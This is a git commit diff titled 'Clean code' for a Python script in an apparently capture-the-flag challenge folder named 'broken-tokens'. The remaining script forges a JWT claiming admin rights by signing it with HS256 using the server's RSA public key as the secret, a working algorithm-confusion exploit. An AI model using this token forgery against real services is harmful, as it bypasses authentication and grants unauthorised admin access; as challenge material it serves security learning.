eac7f60f1829284bd96e425b8125005be4e5e5ac
daxcpp <cdavide98carnemolla@gmail.com>
2020-06-07 14:23:49 +0200

    Clean code

--- web/broken-tokens/shared/script.py
+++ web/broken-tokens/shared/script.py
@@ -1,8 +1,4 @@
 import jwt
-# eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9
-# {"typ":"JWT","alg":"RS256"}
-# eyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTUwNDAwNzg3NCwiZXhwIjoxNTA0MDA3OTk0LCJkYXRhIjp7ImhlbGxvIjoid29ybGQifX0
-# {"iss":"http:\/\/demo.sjoerdlangkemper.nl\/","iat":1504007874,"exp":1504007994,"data":{"hello":"world"}}
 
 public = open('public.pem', 'r').read()
 print(public)
@@ -10,11 +6,4 @@ print(public)
 
 val = jwt.encode({"auth":"admin"}, key=public, algorithm='HS256')
 
-
-
 print(val)
-
-decoded = jwt.decode(val, public)["auth"] == "admin"
-
-
-print(decoded)
